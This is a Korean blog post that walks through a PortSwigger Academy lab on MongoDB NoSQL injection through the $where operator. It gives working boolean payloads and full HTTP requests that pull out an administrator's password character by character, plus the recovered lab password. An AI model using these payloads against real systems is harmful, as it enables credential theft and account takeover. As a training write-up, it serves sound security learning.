---
layout: post
title: "Burp Academy-NoSQLi 관련 취약점: Exploiting NoSQL injection to extract data"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, SQLi, NoSQL, NoSQL injecition]
toc: true
last_modified_at: 2023-10-04 09:50:00 +0900
---

# 개요
- 새로 추가된 NoSQL인젝션 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data
- 취약점 설명페이지: https://portswigger.net/web-security/nosql-injection
- 난이도: PRACTITIONER (보통)

# NoSQL 인젝션 - syntax injection을 사용해서 데이터 얻어내기 (Exploiting syntax injection to extract data) 설명
- 많은 NoSQL 데이터베이스에서 어떤 오퍼레이터 또는 함수는 제한된 Javascript코드 실행을 할 수 있다. 
- MongoDB에서는  $where 오퍼레이터나 mapReduce()함수가 해당된다. 
- 이는 NoSQL인젝션이 가능한 취약한 어플리케이션에서 쿼리를 수행할 때 Javascript도 같이 실행됨을 의미한다. 
- 따라서 Javascript함수를 데이터를 뽑아내는 용도로 사용할 수 있다. 

## Exfiltrating data in MongoDB
구체적인 예로 살펴보자. 

유저가 존재하는지 여부와 존재한다면 해당 유저의 롤(권한)을 표시해주는 다음과 같은 취약한 사이트가 있다고 생각해보자. 

`https://insecure-website.com/user/lookup?username=admin`

서버측에서는 `users` 컬렉션에 대해 다음과 같은 NoSQL 쿼리가 실행된다. 

`{"$where":"this.username == 'admin'"}`

쿼리가 `$where` 오퍼레이터를 사용하고 있기 때문에 Javascript 코드 인젝션을 시험해볼 수 있다. 예를 들면, 다음과 같은 페이로드를 시험해볼 수 있다. 

`admin' && this.password[0] == 'a' || 'a'=='b`

이 페이로드는 유저의 패스워드 문자열의 첫번째 문자를 리턴하기 때문에 문자를 하나씩 얻어낼 수 있다. 

음.. 그런데 `|| 'a' == 'b` 페이로드가 있는 이유를 모르겠다. 이 것은 `|| False` 와 동일한데, 다음 연산식과 결과에 따르면 없어도 결과는 동일하기 때문이다. 
(위 식에서 `admin'`은 True 그리고 `'a'=='b` 는 False로 치환가능하다)

내가 뭔가 놓치고 있는걸까? 

```
True && False || False => False
True && False => False


True && True || False => True
Ture && True => True
```

아하! 알겠다. 쿼리를 정상적으로 처리시키기 위해서로 보인다. 페이로드 `|| 'a'=='b` 가 작은 따옴표없이 끝나있는 부분이 포인트이다. 작은 따옴표가 없이 끝나야 서버측의 쿼리가 정상적으로 수행된다. 하지만 그렇다면 페이로드를 `admin' && this.password[0] == 'a`까지만 보내면 동일한 결과를 얻을 수 있을 것으로 보인다. 


그리고 `match()` 을 사용해서도 데이터를 뽑아낼 수 있다. 예를 들어 다음과 같은 페이로드를 사용하면 패스워드에 숫자가 포함되어 있는지를 판단할 수 있다. 

`admin' && this.password.match(/\d/) || 'a'=='b`


# 랩설명
- 이 랩에는 NoSQL 인젝션이 가능한 취약점이 있다. 
- administrator 유저의 패스워드를 알아내서 이 유저로 로그인하면 문제가 풀린다. 
- 패스워드는 알파벳 소문자만 쓰고 있다. 

```
The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, extract the password for the administrator user, then log in to their account.

You can log in to your own account using the following credentials: wiener:peter.

Tip
The password only uses lowercase letters.
```

# 풀이 
## 살펴보기

wiener 계정으로 로그인해서면 로그인 성공 후 다음 URL로 리다이렉트되는 것을 확인가능하다. 

`https://0a2e00d903fd90de80edd04c00c60031.web-security-academy.net/my-account?id=wiener`

![로그인후화면](/images/burp-academy-nosqli-3-1.png)

이 때 Burp Proxy 히스토리를 보면 다음과 같은 요청이 전달된 것을 알 수 있다. `/user/lookup` 엔드포인트에 wiener유저의 정보를 문의하고 있다. 

```http
GET /user/lookup?user=wiener HTTP/2
Host: 0a2e00d903fd90de80edd04c00c60031.web-security-academy.net
Cookie: session=qFg7SGEbejL6Cn9LoVUTPqDqECnSQMWk
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2e00d903fd90de80edd04c00c60031.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7


```

다음과 같은 응답이 돌아온다. email과 role을 확인할 수 있다. 

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 81

{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "role": "user"
}
```

이 요청을 Reapeter로 보내서 user파라메터를 administrator로 바꿔본다. 

```
GET /user/lookup?user=administrator HTTP/2
Host: 0a2e00d903fd90de80edd04c00c60031.web-security-academy.net
Cookie: session=qFg7SGEbejL6Cn9LoVUTPqDqECnSQMWk
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2e00d903fd90de80edd04c00c60031.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7


```

그러면 다음과 같은 응답이 돌아온다. administrator계정이 존재한다는 것, 그리고 권한(role)도 administrator라는 것을 확인했다. 

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 96

{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
```

## NoSQL 인젝션이 가능한 곳 찾아내기 
그러면 이제 NoSQL 인젝션이 가능한 곳을 찾아야 한다. 일단 가능성이 높아보이는 곳은 `POST /login` 엔드포인트다. 

username 파라메터를 시도해본다. wiener에 작은 따옴표를 붙여서 `wiener'`를 보내자 200응답과 `Invalid username or password.`라는 응답이 돌아왔다. 

password 파라메터를 시도해본다. peter에 작은 따옴표를 붙여서 `peter'`를 보내자 200응답과 `Invalid username or password.`라는 응답이 돌아왔다. 

이 것으로 보아 `POST /login`은 인젝션이 안되는 것으로 보인다. 

그러면 다음으로 `GET /user/lookup` 엔드포인트를 테스트해본다. 

정상적으로 동작하면 `GET /user/lookup?user=administrator`에 짝은 따옴표를 URL인코딩한 `%27`를 붙여서 보내본다. 

`GET /user/lookup?user=administrator%27`로 요청을 보내자 다음과 같이 에러가 발생했다는 응답이 회신된다. 

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 58

{
  "message": "There was an error getting user details"
}
```

이번에는 `%27`앞에 이스케이프를 의미하는 역슬래시를 붙여서 보내본다. `GET /user/lookup?user=administrator\%27` 요청을 보내자 다음과 같이 해당user를 찾을 수 없다는 정상처리된 응답이 돌아왔다. 이 것을 통해 이 엔드포인트를 NoSQL 인젝션이 가능한 것을 알게되었다. 

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 38

{
  "message": "Could not find user"
}
```

## 공격
NoSQL 인젝션이 가능한 곳을 알았으니 이제 administrator유저의 패스워드를 하나씩 알아낸다. 

## 패스워드에 숫자가 포함되어 있는지 확인
다음 페이로드를 보내본다. 

`administrator' && this.password.match(/\d/) || 'a'=='b` 

공백이 포함되어 있으므로 웹 브라우저에서 URL에 다음 경로를 쳐서 접속하면 URL인코딩을 브라우저가 해주므로 간편하다. 

`https://0a2e00d903fd90de80edd04c00c60031.web-security-academy.net/user/lookup?user=administrator' && this.password.match(/\d/) || 'a'=='b`

URL인코딩된 결과는 다음과 같다. 

`https://0a2e00d903fd90de80edd04c00c60031.web-security-academy.net/user/lookup?user=administrator%27%20&&%20this.password.match(/\d/)%20||%20%27a%27==%27b`

그런데 서버의 응답은 `"There was an error getting user details"` 였다. NoSQL에러가 발생한 것이다.

음...쿼리 문법상으로 문제가 있는 것 같다. 페이로드 `administrator' && this.password.match(/\d/) || 'a'=='b` 에서 `&& this.password.match(/\d/)` 부분을 제거하고 `administrator' || 'a'=='b` 로 테스트해본다. 

이번에는 정상적으로 administrator 계정의 정보가 조회되었다.  

```
{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
```

`&& this.password.match(/\d/)` 부분이 뭔가 문법적으로 에러가 있는 것으로 보인다. 만약 문법적으로 문제가 없고 제대로 처리되었으면 결과가 True 또는 False 되어 administrator정보가 조회되거나 해당 유저를 찾을 수 없다는 메세지가 회신되었을 것이다. 

아니다... 아마 `&& this.password.match(/\d/)`의 앰퍼샌드(&) 기호가 URL에서는 파라메터를 구분하는 용도로 쓰이기 때문에 서버측에서 에러가 발생한 것 이다. `&`를 URL인코딩하면 `%26`이므로 `&`를 `%26`으로 변환해서 보내보자. 


HTTP요청이다. 

```http
GET /user/lookup?user=administrator%27%20%26%26%20this.password.match(/\d/)%20||%20%27a%27==%27b HTTP/2
Host: 0aa700fd034c830d81cad4a300640087.web-security-academy.net
Cookie: session=tEl6FiREhuIvrPyCDJMkLiV7NsZk1byw
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7


```

유저를 찾을 수 없다는 메세지가 회신됐다. 이는 `this.password.match(/\d/)`가 False로 처리되었음을 의미한다. 즉, 패스워드에는 숫자가 포함되어 있지 않은 것이다. 

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 38

{
  "message": "Could not find user"
}
```


## 패스워드 길이 확인
그러면 다음으로 패스워드의 길이를 알아내보자. 패스워드의 길이를 알면 패스워드의 문자를 하나씩 알아내는 작업을 몇 번해야하는지 판단할 수 있다. 

자바스크립트에서 길이는 `문자열변수.length` 로 확인할 수 있다. 


페이로드  `administrator' && this.password.length > 4 || 'a'=='b` 를 테스트해본다. 

http요청은 다음과 같다. 

```http
GET /user/lookup?user=administrator%27%20%26%26%20this.password.length%20%3E%204%20||%20%27a%27==%27b HTTP/2
Host: 0aa700fd034c830d81cad4a300640087.web-security-academy.net
Cookie: session=tEl6FiREhuIvrPyCDJMkLiV7NsZk1byw
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7


```

응답은 다음과 같았다. 이는 `this.password.length > 4`의 결과가 True임을 의미한다. 패스워드는 네 자리 이상인 것을 알았다. 

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 96

{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
```

이제 위의 테스트를 반복해서 패스워드의 길이를 알아낸다. 반복하다보면 `this.password.length > 7` 에서는 결과가 True였는데 `this.password.length > 8` 에서는 결과가 False인 것을 알 수 있다. 따라서 패스워드의 길이는 8자리인 것을 알 수 있다. 

## 패스워드의 각 자리수의 값을 알아내기 
힌트에서 각 패스워드는 알파벳 소문자만 쓰고 있다고 했으므로 각 패스워드 자리마다 최대 26번(알파벳개수) 테스트하면 값을 알아낼 수 있을 것이다. 

페이로드는 다음을 사용한다. 패스워드의 자리와 비교할 문자는 적절히 바꾸면서 테스트한다. 

`administrator' && this.password[0] == 'a' || 'a'=='b`

### 패스워드의 첫번째 값 알아내기 

패스워드 값이 `g`일 때 administrator유저의 데이터를 포함한 응답이 돌아왔다. 패스워드의 첫번째 자리는 g인 것을 알았다. 

```http
GET /user/lookup?user=administrator%27%20%26%26%20this.password[0]%20==%20%27g%27%20||%20%27b%27==%27b HTTP/2
Host: 0aa700fd034c830d81cad4a300640087.web-security-academy.net
Cookie: session=tEl6FiREhuIvrPyCDJMkLiV7NsZk1byw
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7


```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 96

{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
```

### Intruder를 사용해서 나머지 패스워드 알아내기
그런데 이 과정을 앞으로 7번 더 하려면 조금 귀찮다. Intruder를 사용하면 조금 더 쉽게 할 수 있을 것이다. 페이로드 타입 Simple List에 a부터 z까지 추가한다. 

![a부터z까지 페이로드 추가하기](/images/burp-academy-nosqli-3-3.png)

그리고 password부분을 페이로드로 추가해둔다. 

![Intruder 페이로드 설정](/images/burp-academy-nosqli-3-2.png)

공격을 수행하면 특정 문자일 때만 응답의 길이가 긴 것을 확인할 수 있다. 이 것이 맞는 패스워드이다. 

![공격수행 결과](/images/burp-academy-nosqli-3-4.png)

테스트를 수행하면 결과적으로 `gxcuorbr`가 패스워드인 것을 알 수 있다. 이 걸로 로그인해본다. 그러면 로그인에 성공하고 문제가 풀렸다는 메세지가 표시된다. 

![문제 풀이 성공](/images/burp-academy-nosqli-3-success.png)

※ 정답을 보니 Intruder에서 Cluster Bomb를 사용했으면 패스워드를 알아내는 과정을 더 자동화할 수 있었다. 